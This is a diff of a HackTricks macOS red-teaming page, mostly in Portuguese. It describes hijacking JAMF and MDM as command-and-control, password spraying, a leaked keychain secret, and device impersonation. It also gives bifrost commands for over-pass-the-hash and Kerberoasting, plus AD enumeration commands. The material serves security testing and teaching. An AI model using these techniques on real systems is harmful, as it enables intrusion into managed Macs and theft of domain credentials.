@@ -1,16 +1,16 @@
-# Red Team macOS
+# macOS Red Teaming
 
 {% hint style="success" %}
-Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Apoie o HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -20,9 +20,9 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 * JAMF Pro: `jamf checkJSSConnection`
 * Kandji
 
-Se você conseguir **comprometer as credenciais de administrador** para acessar a plataforma de gerenciamento, você pode **potencialmente comprometer todos os computadores** distribuindo seu malware nas máquinas.
+Se você conseguir **comprometer credenciais de administrador** para acessar a plataforma de gerenciamento, você pode **potencialmente comprometer todos os computadores** distribuindo seu malware nas máquinas.
 
-Para red teaming em ambientes macOS, é altamente recomendável ter algum entendimento de como os MDMs funcionam:
+Para red teaming em ambientes MacOS, é altamente recomendável ter algum entendimento de como os MDMs funcionam:
 
 {% content-ref url="macos-mdm/" %}
 [macos-mdm](macos-mdm/)
@@ -30,27 +30,27 @@ Para red teaming em ambientes macOS, é altamente recomendável ter algum entend
 
 ### Usando MDM como um C2
 
-Um MDM terá permissão para instalar, consultar ou remover perfis, instalar aplicativos, criar contas de administrador locais, definir senha de firmware, alterar a chave do FileVault...
+Um MDM terá permissão para instalar, consultar ou remover perfis, instalar aplicativos, criar contas de administrador locais, definir senha de firmware, mudar a chave do FileVault...
 
-Para executar seu próprio MDM, você precisa **do seu CSR assinado por um fornecedor**, que você poderia tentar obter em [**https://mdmcert.download/**](https://mdmcert.download/). E para executar seu próprio MDM para dispositivos Apple, você poderia usar [**MicroMDM**](https://github.com/micromdm/micromdm).
+Para executar seu próprio MDM, você precisa que **seu CSR seja assinado por um fornecedor**, o que você pode tentar obter com [**https://mdmcert.download/**](https://mdmcert.download/). E para executar seu próprio MDM para dispositivos Apple, você pode usar [**MicroMDM**](https://github.com/micromdm/micromdm).
 
 No entanto, para instalar um aplicativo em um dispositivo inscrito, você ainda precisa que ele seja assinado por uma conta de desenvolvedor... no entanto, após a inscrição no MDM, o **dispositivo adiciona o certificado SSL do MDM como uma CA confiável**, então agora você pode assinar qualquer coisa.
 
-Para inscrever o dispositivo em um MDM, você precisa instalar um arquivo **`mobileconfig`** como root, que poderia ser entregue via um arquivo **pkg** (você poderia comprimi-lo em zip e quando baixado do safari ele será descompactado).
+Para inscrever o dispositivo em um MDM, você precisa instalar um arquivo **`mobileconfig`** como root, que pode ser entregue via um arquivo **pkg** (você pode compactá-lo em zip e, quando baixado do safari, ele será descompactado).
 
-O **agente Mythic Orthrus** usa essa técnica.
+**Mythic agent Orthrus** usa essa técnica.
 
 ### Abusando do JAMF PRO
 
-O JAMF pode executar **scripts personalizados** (scripts desenvolvidos pelo sysadmin), **cargas nativas** (criação de contas locais, definir senha EFI, monitoramento de arquivos/processos...) e **MDM** (configurações de dispositivo, certificados de dispositivo...).
+JAMF pode executar **scripts personalizados** (scripts desenvolvidos pelo sysadmin), **payloads nativos** (criação de conta local, definir senha EFI, monitoramento de arquivos/processos...) e **MDM** (configurações de dispositivo, certificados de dispositivo...).
 
-#### Autoinscrição do JAMF
+#### Auto-inscrição do JAMF
 
-Acesse uma página como `https://<nome-da-empresa>.jamfcloud.com/enroll/` para ver se eles têm a **autoinscrição ativada**. Se tiver, pode **solicitar credenciais para acessar**.
+Vá para uma página como `https://<company-name>.jamfcloud.com/enroll/` para ver se eles têm **auto-inscrição habilitada**. Se tiver, pode **pedir credenciais para acessar**.
 
-Você poderia usar o script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) para realizar um ataque de pulverização de senha.
+Você pode usar o script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) para realizar um ataque de password spraying.
 
-Além disso, após encontrar as credenciais adequadas, você pode ser capaz de fazer força bruta em outros nomes de usuário com o próximo formulário:
+Além disso, após encontrar credenciais adequadas, você pode ser capaz de forçar outros nomes de usuário com o próximo formulário:
 
 ![](<../../.gitbook/assets/image (107).png>)
 
@@ -61,9 +61,9 @@ Além disso, após encontrar as credenciais adequadas, você pode ser capaz de f
 O binário **`jamf`** continha o segredo para abrir o keychain que, na época da descoberta, era **compartilhado** entre todos e era: **`jk23ucnq91jfu9aj`**.\
 Além disso, o jamf **persiste** como um **LaunchDaemon** em **`/Library/LaunchAgents/com.jamf.management.agent.plist`**
 
-#### Assumindo o Controle do Dispositivo JAMF
+#### Tomada de Controle do Dispositivo JAMF
 
-A URL do **JSS** (Jamf Software Server) que o **`jamf`** usará está localizada em **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
+A **URL** do **JSS** (Jamf Software Server) que **`jamf`** usará está localizada em **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
 Este arquivo basicamente contém a URL:
 
 {% code overflow="wrap" %}
@@ -81,7 +81,9 @@ plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist
 ```
 {% endcode %}
 
-Assim, um atacante poderia inserir um pacote malicioso (`pkg`) que **sobrescreve este arquivo** ao ser instalado, configurando o **URL para um ouvinte do Mythic C2 a partir de um agente Typhon** para agora poder abusar do JAMF como C2.
+Assim, um atacante poderia instalar um pacote malicioso (`pkg`) que **substitui este arquivo** ao ser instalado, configurando a **URL para um listener Mythic C2 de um agente Typhon** para agora poder abusar do JAMF como C2.
+
+{% code overflow="wrap" %}
 ```bash
 # After changing the URL you could wait for it to be reloaded or execute:
 sudo jamf policy -id 0
@@ -90,16 +92,16 @@ sudo jamf policy -id 0
 ```
 {% endcode %}
 
-#### Impersonação JAMF
+#### Impersonação do JAMF
 
-Para **impersonar a comunicação** entre um dispositivo e o JMF você precisa de:
+Para **impersonar a comunicação** entre um dispositivo e o JMF, você precisa:
 
 * O **UUID** do dispositivo: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
-* O **keychain JAMF** de: `/Library/Application\ Support/Jamf/JAMF.keychain` que contém o certificado do dispositivo
+* O **keychain do JAMF** de: `/Library/Application\ Support/Jamf/JAMF.keychain`, que contém o certificado do dispositivo
 
-Com essas informações, **crie uma VM** com o **UUID de Hardware roubado** e com o **SIP desativado**, solte o **keychain JAMF**, **intercepte** o **agente Jamf** e roube suas informações.
+Com essas informações, **crie uma VM** com o **UUID** de Hardware **roubado** e com o **SIP desativado**, coloque o **keychain do JAMF,** **hook** o **agente** Jamf e roube suas informações.
 
-#### Roubo de Segredos
+#### Roubo de segredos
 
 <figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>
 
@@ -107,11 +109,11 @@ Você também pode monitorar a localização `/Library/Application Support/Jamf/
 
 No entanto, **credenciais** podem ser passadas para esses scripts como **parâmetros**, então você precisaria monitorar `ps aux | grep -i jamf` (sem nem mesmo ser root).
 
-O script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) pode ouvir novos arquivos sendo adicionados e novos argumentos de processo.
+O script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) pode escutar por novos arquivos sendo adicionados e novos argumentos de processo.
 
 ### Acesso Remoto ao macOS
 
-E também sobre os **protocolos** de **rede** **"especiais"** do **MacOS**:
+E também sobre os **protocolos** **de rede** "especiais" do **MacOS**:
 
 {% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
 [macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
@@ -119,7 +121,7 @@ E também sobre os **protocolos** de **rede** **"especiais"** do **MacOS**:
 
 ## Active Directory
 
-Em algumas ocasiões, você descobrirá que o **computador MacOS está conectado a um AD**. Nesse cenário, você deve tentar **enumerar** o active directory como está acostumado. Encontre alguma **ajuda** nas seguintes páginas:
+Em algumas ocasiões, você encontrará que o **computador MacOS está conectado a um AD**. Nesse cenário, você deve tentar **enumerar** o diretório ativo como está acostumado. Encontre alguma **ajuda** nas seguintes páginas:
 
 {% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
 [pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
@@ -140,10 +142,10 @@ dscl "/Active Directory/[Domain]/All Domains" ls /
 Também existem algumas ferramentas preparadas para MacOS para enumerar automaticamente o AD e interagir com o kerberos:
 
 * [**Machound**](https://github.com/XMCyber/MacHound): MacHound é uma extensão da ferramenta de auditoria Bloodhound que permite coletar e ingerir relacionamentos do Active Directory em hosts MacOS.
-* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost é um projeto Objective-C projetado para interagir com as APIs Heimdal krb5 no macOS. O objetivo do projeto é permitir testes de segurança mais eficazes em torno do Kerberos em dispositivos macOS usando APIs nativas sem exigir nenhum outro framework ou pacotes no alvo.
-* [**Orchard**](https://github.com/its-a-feature/Orchard): Ferramenta JavaScript for Automation (JXA) para enumeração do Active Directory.
+* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost é um projeto em Objective-C projetado para interagir com as APIs Heimdal krb5 no macOS. O objetivo do projeto é permitir testes de segurança melhores em torno do Kerberos em dispositivos macOS usando APIs nativas, sem exigir nenhum outro framework ou pacotes no alvo.
+* [**Orchard**](https://github.com/its-a-feature/Orchard): Ferramenta JavaScript para Automação (JXA) para fazer enumeração do Active Directory.
 
-### Informações de Domínio
+### Informações do Domínio
 ```bash
 echo show com.apple.opendirectoryd.ActiveDirectory | scutil
 ```
@@ -151,18 +153,18 @@ echo show com.apple.opendirectoryd.ActiveDirectory | scutil
 
 Os três tipos de usuários do MacOS são:
 
-- **Usuários Locais** — Gerenciados pelo serviço local OpenDirectory, não estão conectados de forma alguma ao Active Directory.
-- **Usuários de Rede** — Usuários voláteis do Active Directory que requerem uma conexão com o servidor DC para autenticação.
-- **Usuários Móveis** — Usuários do Active Directory com um backup local de suas credenciais e arquivos.
+* **Usuários Locais** — Gerenciados pelo serviço local OpenDirectory, não estão conectados de nenhuma forma ao Active Directory.
+* **Usuários de Rede** — Usuários voláteis do Active Directory que requerem uma conexão com o servidor DC para autenticação.
+* **Usuários Móveis** — Usuários do Active Directory com um backup local para suas credenciais e arquivos.
 
 As informações locais sobre usuários e grupos são armazenadas na pasta _/var/db/dslocal/nodes/Default._\
-Por exemplo, as informações sobre o usuário chamado _mark_ são armazenadas em _/var/db/dslocal/nodes/Default/users/mark.plist_ e as informações sobre o grupo _admin_ estão em _/var/db/dslocal/nodes/Default/groups/admin.plist_.
+Por exemplo, as informações sobre o usuário chamado _mark_ estão armazenadas em _/var/db/dslocal/nodes/Default/users/mark.plist_ e as informações sobre o grupo _admin_ estão em _/var/db/dslocal/nodes/Default/groups/admin.plist_.
 
-Além de usar as arestas HasSession e AdminTo, o **MacHound adiciona três novas arestas** ao banco de dados Bloodhound:
+Além de usar as arestas HasSession e AdminTo, **MacHound adiciona três novas arestas** ao banco de dados Bloodhound:
 
-- **CanSSH** - entidade autorizada a fazer SSH para o host
-- **CanVNC** - entidade autorizada a fazer VNC para o host
-- **CanAE** - entidade autorizada a executar scripts AppleEvent no host
+* **CanSSH** - entidade permitida para SSH no host
+* **CanVNC** - entidade permitida para VNC no host
+* **CanAE** - entidade permitida para executar scripts AppleEvent no host
 ```bash
 #User enumeration
 dscl . ls /Users
@@ -186,6 +188,37 @@ dsconfigad -show
 ```
 Mais informações em [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
 
+### Computer$ senha
+
+Obtenha senhas usando:
+```bash
+bifrost --action askhash --username [name] --password [password] --domain [domain]
+```
+É possível acessar a senha **`Computer$`** dentro do chaveiro do Sistema.
+
+### Over-Pass-The-Hash
+
+Obtenha um TGT para um usuário e serviço específicos:
+```bash
+bifrost --action asktgt --username [user] --domain [domain.com] \
+--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
+```
+Uma vez que o TGT é coletado, é possível injetá-lo na sessão atual com:
+```bash
+bifrost --action asktgt --username test_lab_admin \
+--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
+--enctype aes256 --domain test.lab.local
+```
+### Kerberoasting
+```bash
+bifrost --action asktgs --spn [service] --domain [domain.com] \
+--username [user] --hash [hash] --enctype [enctype]
+```
+Com os tickets de serviço obtidos, é possível tentar acessar compartilhamentos em outros computadores:
+```bash
+smbutil view //computer.fqdn
+mount -t smbfs //server/folder /local/mount/point
+```
 ## Acessando o Keychain
 
 O Keychain provavelmente contém informações sensíveis que, se acessadas sem gerar um prompt, poderiam ajudar a avançar em um exercício de red team:
@@ -196,13 +229,13 @@ O Keychain provavelmente contém informações sensíveis que, se acessadas sem 
 
 ## Serviços Externos
 
-O Red Teaming do MacOS é diferente de um Red Teaming regular do Windows, pois geralmente **o MacOS está integrado com várias plataformas externas diretamente**. Uma configuração comum do MacOS é acessar o computador usando **credenciais sincronizadas do OneLogin e acessar vários serviços externos** (como github, aws...) via OneLogin.
+O Red Teaming no MacOS é diferente do Red Teaming regular no Windows, pois geralmente **o MacOS está integrado com várias plataformas externas diretamente**. Uma configuração comum do MacOS é acessar o computador usando **credenciais sincronizadas do OneLogin e acessar vários serviços externos** (como github, aws...) via OneLogin.
 
-## Técnicas Misc Red Team
+## Técnicas Diversas de Red Team
 
 ### Safari
 
-Quando um arquivo é baixado no Safari, se for um arquivo "seguro", ele será **aberto automaticamente**. Por exemplo, se você **baixar um arquivo zip**, ele será descompactado automaticamente:
+Quando um arquivo é baixado no Safari, se for um arquivo "seguro", ele será **aberto automaticamente**. Então, por exemplo, se você **baixar um zip**, ele será automaticamente descompactado:
 
 <figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>
 
@@ -215,16 +248,16 @@ Quando um arquivo é baixado no Safari, se for um arquivo "seguro", ele será **
 * [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
 
 {% hint style="success" %}
-Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Suporte ao HackTricks</summary>
+<summary>Support HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
